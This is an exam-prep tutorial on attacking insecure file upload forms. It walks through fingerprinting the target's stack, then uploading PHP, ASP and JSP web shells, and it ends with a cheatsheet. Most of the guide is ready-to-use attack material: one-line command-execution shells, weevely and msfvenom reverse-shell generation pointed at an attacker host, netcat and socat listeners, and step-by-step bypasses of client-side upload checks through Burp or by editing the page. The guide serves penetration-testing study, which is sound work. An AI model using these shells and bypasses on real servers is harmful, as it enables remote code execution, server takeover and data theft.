---
title: 'File Upload Attacks'
description: 'A practical, exam-focused guide to abusing insecure file upload functionality — from absent validation to client-side bypasses — with web shells, reverse shells, and a quick-reference cheatsheet.'
date: 2026-06-17
authors:
  name: Bilash J. Shahi
  title: Cybersecurity enthusiast
  picture: https://avatars.githubusercontent.com/elodvk
  url: https://purplesec.org
tags:
  - CPTS
  - Web
  - File Upload
  - Web Shell
  - Reverse Shell
  - RCE
image: ''
---

# File Upload Attacks

!!! abstract "Mentor's Note"
    File upload is one of the highest-value attack surfaces on the web. If you can write a file the server will *execute*, you usually own the box. Treat every upload form as a potential remote code execution (RCE) primitive until you prove otherwise. This guide walks the full workflow, then ends with a [cheatsheet](#cheatsheet) you can skim five minutes before the exam.

## The Core Idea

Almost every modern app lets users upload *something* — profile pictures, PDFs, attachments. The moment an app accepts user-controlled files, it accepts the risk of storing **attacker-controlled data on its own server**. If the file type and contents aren't strictly validated, you can often upload a script the server will run for you.

These bugs are consistently rated **High/Critical** in CVE databases for one reason: a successful arbitrary file upload is one short step from full server compromise. The worst case is an **unauthenticated arbitrary file upload** — anyone, no login required, drops a payload and gets code execution.

## What File Uploads Get You

The headline outcome is **RCE via a web shell or reverse shell**. But even when you *can't* upload arbitrary code, a weak upload feature can still be abused:

- **Stored XSS** — upload an HTML/SVG file containing JavaScript.
- **XXE** — upload a malicious SVG or XML-based document (e.g. DOCX, which is XML under the hood).
- **Denial of Service** — decompression bombs (zip bombs), pixel-flood images, or filling the disk.
- **Overwriting critical files** — path traversal in the filename (`../../`) to clobber config or app files.
- **SSRF / second-order attacks** — upload a file processed by a vulnerable back-end library.

!!! warning "Vulnerable libraries count too"
    File upload bugs aren't only about sloppy validation code. Outdated image/PDF/parsing libraries (ImageMagick "ImageTragick", `libvips`, etc.) are routinely exploitable through an otherwise "safe" upload.

## The Attack Workflow

1. **Test for absent validation** — can you just upload a script?
2. **Fingerprint the stack** — what language/framework runs the app? Your payload must match it.
3. **Prove code execution** — upload a harmless "Hello World" script first.
4. **Weaponize** — drop a web shell or reverse shell.
5. **If blocked, bypass** — start with client-side validation (the weakest), then move to server-side filters.

---

## Step 1 — Absent Validation

The simplest case: the app has **no validation at all** and accepts any file type by default. You upload your shell, visit it, done.

Take this Employee File Manager. It says nothing about allowed types, and the drop zone happily accepts a `.php` file:

![File manager upload form](assets/file-upload-attacks/file-manager-upload-form.png)

![PHP file accepted by the front-end](assets/file-upload-attacks/php-file-accepted.png)

No front-end restriction is a strong hint that the back-end may be just as permissive. If so, we can upload an arbitrary file and take over the server.

---

## Step 2 — Fingerprint the Web Stack

A web shell must be written in the **same language the server executes** (PHP, ASP/ASPX, JSP, etc.) — these scripts call platform-specific functions, so they aren't cross-platform. So first: what's running?

**Method 1 — Page extensions & index probing.** The URL extension often gives it away (`.php`, `.aspx`...). When routes hide it, probe for index pages by swapping the extension:

```
http://TARGET/index.php
http://TARGET/index.asp
http://TARGET/index.aspx
http://TARGET/index.jsp
```

If `index.php` returns the same page as `/`, it's a PHP app:

![index.php returns the same page](assets/file-upload-attacks/index-php-probe.png)

**Method 2 — Fuzz the extension.** Don't do it by hand. Use a fuzzer with a web-extensions wordlist:

```shell
# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:EXT \
     -u http://TARGET/indexFUZZ -mc 200

# Burp Intruder / wfuzz are equally fine here
```

**Method 3 — Tech fingerprinting tools.** Identify language, server, OS, and frameworks at a glance:

- **Wappalyzer** (browser extension) — quick visual readout.
- **whatweb** — `whatweb http://TARGET` (CLI, scriptable).
- **httpx** — `httpx -u http://TARGET -td` (fast, tech-detect flag).
- **nmap** — `nmap -p80,443 --script=http-enum,http-headers TARGET`.
- **BuiltWith** — web-based lookup for public sites.
- **Burp / OWASP ZAP** passive scanners.

![Wappalyzer showing PHP and server details](assets/file-upload-attacks/wappalyzer-fingerprint.png)

!!! tip
    Tools are fast but can be wrong (or blocked). Always keep the manual `index.ext` trick in your back pocket — it works when extensions and scanners don't.

---

## Step 3 — Prove Code Execution

Before throwing a shell, confirm the server *executes* your file rather than just storing it. Upload a minimal proof-of-concept. For PHP, write this to `test.php`:

```php
<?php echo "Hello World"; ?>
```

![Uploading the test PHP file](assets/file-upload-attacks/upload-test-php.png)

Then open the uploaded file:

![Server prints "Hello World"](assets/file-upload-attacks/hello-world-output.png)

If the page prints **Hello World**, PHP ran — you have code execution. If it prints the **raw source** instead, the file was stored but not executed (still potentially useful for XSS/other attacks, but not RCE here).

---

## Step 4 — Weaponize

### Option A — Web Shells

A web shell takes commands via HTTP and prints the output in your browser — great for quick enumeration.

**Grab a ready-made one:**

- **phpbash** — semi-interactive, terminal-like PHP shell.
- **SecLists** — bundles shells for many languages (`/usr/share/seclists/Web-Shells/`).
- **weevely** — generates a stealthy, obfuscated, password-protected PHP shell and gives you a client to drive it:
  ```shell
  weevely generate <password> shell.php   # upload shell.php
  weevely http://TARGET/uploads/shell.php <password>
  ```
- Others worth knowing: **p0wny-shell** (single-file PHP), **b374k**, **WSO**, and **Antak** (ASPX, from Nishang) / **China Chopper** for .NET shops.

Upload it, visit it, enumerate:

![phpbash terminal-like web shell](assets/file-upload-attacks/phpbash-web-shell.png)

### Option B — Write Your Own Web Shell

You won't always have internet access mid-engagement, so memorize a one-liner. PHP:

```php
<?php system($_REQUEST['cmd']); ?>
```

Save as `shell.php`, upload, then run commands via the `cmd` parameter:

```
http://TARGET/uploads/shell.php?cmd=id
```

![Custom web shell running id](assets/file-upload-attacks/custom-web-shell-id.png)

!!! tip "Read output cleanly"
    In a browser, hit ++ctrl+u++ to view source — command output renders as plain terminal text without HTML mangling.

Equivalent minimal shells for other stacks:

```asp
<%-- Classic ASP --%>
<% eval request("cmd") %>
```
```jsp
<%-- JSP --%>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

!!! note "When web shells fail"
    `system()`/`exec()` may be disabled (`disable_functions`), or a WAF may block them. Try alternative PHP exec functions (`shell_exec`, `passthru`, `proc_open`, `popen`) or pivot to a reverse shell. Defeating WAFs/`disable_functions` is a deeper topic beyond this section.

### Option C — Reverse Shells (preferred)

A reverse shell is fully interactive — almost always nicer than a web shell. Match the language to the app.

**1. Get a payload and set your IP/port:**

- **pentestmonkey PHP reverse shell** — edit the `$ip` / `$port` (around lines 49–50).
- **revshells.com** — online generator for dozens of payloads/languages; copy-paste ready.
- **SecLists** — reverse shells for many frameworks.

![Editing IP and port in the pentestmonkey script](assets/file-upload-attacks/pentestmonkey-edit-ip-port.png)

**2. Start a listener, upload, and trigger it:**

```shell
nc -lvnp 4444
# upgrade tip: rlwrap nc -lvnp 4444   (readline/history in the shell)
```

```shell
Listening on 0.0.0.0 4444
connect to [10.10.15.193] from (UNKNOWN) [TARGET] 32694
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

!!! tip "Better listeners"
    Swap `nc` for **pwncat-cs** (auto stabilization, file transfer, persistence) or **socat** for an encrypted/upgraded TTY:
    ```shell
    pwncat-cs -lp 4444
    socat file:`tty`,raw,echo=0 tcp-listen:4444
    ```

### Generating Shells with msfvenom

When you want a reliable, framework-native reverse shell without hand-editing scripts, let **msfvenom** build it:

```shell
msfvenom -p php/reverse_php LHOST=10.10.15.193 LPORT=4444 -f raw > reverse.php
# Payload size: 2678 bytes
```

Start your listener, upload `reverse.php`, visit it:

```shell
nc -lvnp 4444
Listening on 0.0.0.0 4444
connect to [10.10.15.193] from (UNKNOWN) [TARGET] 38342
```

The same approach generates payloads for other languages — pick the payload with `-p` and the output format with `-f`. List options with `msfvenom --list payloads | grep reverse`.

!!! info "Reverse vs. web shell"
    Reverse shells are more interactive, but outbound connections can be blocked by egress firewalls, or the language may have socket functions disabled. Keep a web shell ready as a fallback.

---

## Step 5 — Bypassing Client-Side Validation

Many apps validate the file in the browser with JavaScript only. Since **anything running client-side is under your control**, this is the easiest filter class to defeat. If the server doesn't re-validate, you win.

Here's a profile-image uploader. The file dialog is locked to images:

![Profile image upload feature](assets/file-upload-attacks/profile-image-upload.png)

![File dialog limited to image formats](assets/file-upload-attacks/file-dialog-images-only.png)

Picking *All Files* and selecting a PHP script throws "Only images are allowed!" and disables the Upload button — and notice the page never sends a request, confirming validation is purely front-end:

![Front-end error blocks the upload](assets/file-upload-attacks/frontend-validation-error.png)

There are two clean ways to bypass it.

### Bypass A — Modify the Request (Burp/Caido)

Capture a *legitimate* image upload, then tamper with it. The app sends a normal multipart POST to `/upload.php`:

![Normal upload request in Burp](assets/file-upload-attacks/burp-normal-upload-request.png)

![Captured multipart upload request](assets/file-upload-attacks/burp-multipart-request.png)

Two parts matter: `filename="something.png"` and the file body. Change the filename to `shell.php` and replace the body with your web shell:

![Modified request uploading a PHP shell](assets/file-upload-attacks/burp-modified-php-shell.png)

!!! note
    You can also change the `Content-Type` of the file part (e.g. keep `image/png`), but for a purely client-side filter it doesn't matter yet. It *will* matter once we hit server-side MIME checks.

The server accepts it, and you browse to your uploaded shell for RCE:

![File successfully uploaded](assets/file-upload-attacks/burp-upload-success.png)

!!! tip "Proxy alternatives"
    Burp is the standard, but **Caido**, **OWASP ZAP**, and **mitmproxy** all intercept and edit upload requests just as well.

### Bypass B — Disable the Front-end Check

Since the validation lives in the page, just remove it. Open the inspector (++ctrl+shift+c++) and click the upload control:

![Inspecting the file input](assets/file-upload-attacks/inspect-file-input.png)

You'll find the input wired to a JS validator:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

Open the console (++ctrl+shift+k++) and inspect the function:

```javascript
function validate() {
  var file = $("#uploadFile")[0].files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#error_message').text("Only images are allowed!");
    File.form.reset();
    $("#submit").attr("disabled", true);
    return false;
  } else {
    return true;
  }
}
```

It checks the extension, shows the error, and disables the button. You don't need to rewrite any JS — just **delete the `onchange="checkFile(this)"` handler** (and optionally the `accept` attribute) directly in the DOM:

![Removing the onchange handler](assets/file-upload-attacks/remove-onchange-handler.png)

!!! tip
    Removing `accept=".jpg,.jpeg,.png"` makes selecting your PHP file in the dialog easier, but it's optional.

The edit is temporary (it won't survive a refresh), but that's fine — you only need it to live long enough to submit one upload. After uploading, use the inspector again to find your shell's URL:

![Locating the uploaded shell URL](assets/file-upload-attacks/locate-shell-url.png)

Visit it and you've got command execution:

![Interacting with the uploaded web shell](assets/file-upload-attacks/interact-web-shell.png)

!!! danger "The real lesson"
    Client-side validation is a UX feature, never a security control. **Every** upload restriction must be enforced server-side. If it isn't, all of the above applies.

---

## Tooling Reference

| Job | Primary | Alternatives |
|-----|---------|--------------|
| Tech fingerprinting | Wappalyzer | whatweb, httpx, nmap `http-enum`, BuiltWith |
| Extension fuzzing | Burp Intruder | ffuf, wfuzz |
| Intercept/modify upload | Burp Suite | Caido, OWASP ZAP, mitmproxy |
| PHP web shell | `<?php system($_REQUEST['cmd']); ?>` | phpbash, weevely, p0wny-shell, b374k, WSO |
| .NET/ASP shell | `<% eval request("cmd") %>` | China Chopper, Antak (Nishang) |
| Reverse shell payload | pentestmonkey | revshells.com, msfvenom, SecLists |
| Listener | `nc -lvnp` | rlwrap nc, pwncat-cs, socat |
| Shell wordlists/payloads | SecLists `/Web-Shells/` | PayloadsAllTheThings (Upload Insecure Files) |

---

## Cheatsheet

!!! example "Fingerprint the stack"
    ```shell
    # Manual index probe
    curl -s http://TARGET/index.php -o /dev/null -w "%{http_code}\n"

    # Fuzz extensions
    ffuf -w web-extensions.txt:EXT -u http://TARGET/indexFUZZ -mc 200

    # Tech detect
    whatweb http://TARGET
    httpx -u http://TARGET -td
    nmap -p80,443 --script=http-enum TARGET
    ```

!!! example "Code-execution proof (PHP)"
    ```php
    <?php echo "Hello World"; ?>
    ```

!!! example "Minimal web shells"
    ```php
    <?php system($_REQUEST['cmd']); ?>          /* PHP  -> ?cmd=id */
    ```
    ```php
    <?php echo shell_exec($_GET['cmd']); ?>     /* PHP fallback funcs */
    ```
    ```asp
    <% eval request("cmd") %>                    <%-- Classic ASP --%>
    ```
    ```jsp
    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>  <%-- JSP --%>
    ```
    PHP exec functions to try if one is disabled: `system`, `shell_exec`, `exec`, `passthru`, `popen`, `proc_open`.

!!! example "Generate reverse shells"
    ```shell
    msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > reverse.php
    msfvenom --list payloads | grep reverse        # find more
    # or grab a ready payload from https://revshells.com
    ```

!!! example "Listeners"
    ```shell
    nc -lvnp 4444
    rlwrap nc -lvnp 4444        # history + arrow keys
    pwncat-cs -lp 4444          # auto-stabilize + features
    socat file:`tty`,raw,echo=0 tcp-listen:4444   # full TTY
    ```

!!! example "Client-side bypass (Burp)"
    1. Upload a valid image, intercept the POST to `/upload.php`.
    2. Change `filename="img.png"` -> `filename="shell.php"`.
    3. Replace the file body with your web shell.
    4. (Optional) keep `Content-Type: image/png`.
    5. Forward -> browse to the uploaded shell.

!!! example "Client-side bypass (DOM edit)"
    1. ++ctrl+shift+c++ -> click the upload input.
    2. Delete `onchange="checkFile(this)"` (and `accept="..."`).
    3. Select *All Files* -> choose your shell -> upload.

!!! quote "Decision flow"
    Can I upload any file? → **Absent validation: upload shell.**
    Blocked in the browser only? → **Client-side bypass (Burp or DOM edit).**
    Server rejects it? → Move to **server-side filter bypasses** (extension blacklists/whitelists, MIME/Content-Type, magic bytes) — the next stage of the methodology.
